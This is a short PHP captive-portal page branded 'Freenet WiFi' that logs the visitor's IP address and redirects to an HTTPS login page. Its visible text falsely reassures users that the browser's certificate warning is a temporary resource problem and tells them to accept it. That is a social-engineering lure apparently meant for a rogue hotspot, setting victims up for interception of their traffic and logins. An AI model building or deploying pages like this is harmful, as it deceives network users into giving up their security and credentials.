<?php
 session_start();
 if (strlen($_SESSION['customer_ip'])<7){
   $ip = $HTTP_SERVER_VARS["REMOTE_ADDR"];
   $_SESSION['customer_ip'] = $ip;
 }
//echo "ip = $ip <br>";

 header( 'refresh: 0; url= https:login3.html' );
 echo ' <P ALIGN=CENTER><FONT SIZE=6>Welcome to Freenet WiFi</FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><B><FONT SIZE=3 STYLE="font-size: 13pt">You
are now being redirected to the Freenet server.</FONT></B></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT SIZE=3 STYLE="font-size: 13pt"><B>It
will be encrypted but due to limited resources we have no site</B></FONT></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><B><FONT SIZE=3 STYLE="font-size: 13pt">authentication
so you will soon see a message from your browser asking</FONT></B></P>
<P ALIGN=CENTER STYLE="margin-bottom: 0in"><B><FONT SIZE=3 STYLE="font-size: 13pt">you
to accept or deny access. Please continue with accept. </FONT></B>
</P>
<P ALIGN=CENTER><B><FONT SIZE=3>Sorry for this temporary problem, we
hope to fix it soon.</FONT></B></P>
<P ALIGN=CENTER><FONT SIZE=3><B>Thank You and Enjoy.</B></FONT></P>
<P ALIGN=CENTER><BR><BR>
</P>';
?>
